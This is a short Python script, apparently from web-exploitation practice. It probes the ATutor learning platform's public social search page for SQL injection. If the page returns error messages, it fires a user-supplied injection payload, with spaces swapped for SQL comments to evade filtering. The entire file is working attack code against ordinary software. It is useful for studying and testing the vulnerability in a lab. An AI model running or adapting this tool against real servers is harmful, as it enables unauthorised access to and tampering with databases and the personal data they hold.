import sys
import re
import requests
from bs4 import BeautifulSoup


def send_n_print(url, print_header=True):
    r = requests.get(url)
    s = BeautifulSoup(r.text, 'lxml')

    if print_header:
        print("[*] Header: ", r.headers if r.headers else "None")
    print("[*] Body: ", s.text)

    return s

def Inject(ip, payload: str):
	
	# construct the target url

    base_url = f'http://{ip}/ATutor/mods/_standard/social/index_public.php?q='

    s = send_n_print(f"{base_url}user'", False)

	# identify a response with an error
    error = re.search("Warning|error", s.text)

    if error:
        print("[+] Potential SQL injection found!")
        url = f"{base_url}asdf%27)/**/{payload.replace(' ', '/**/')}%23"
        print(url)
        send_n_print(f"{url}", False)
    else:
        print("[-] No errors found")
	
def main():
	if len(sys.argv) != 3:
		print("[*] usage: %s <target> <injection_str>" % sys.argv[0])
		print('[*] eg: %s 127.0.0.1 "AAA\'" ' % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]
	injection_str = sys.argv[2]

	Inject(ip, injection_str)

if __name__ == "__main__": 
	main()
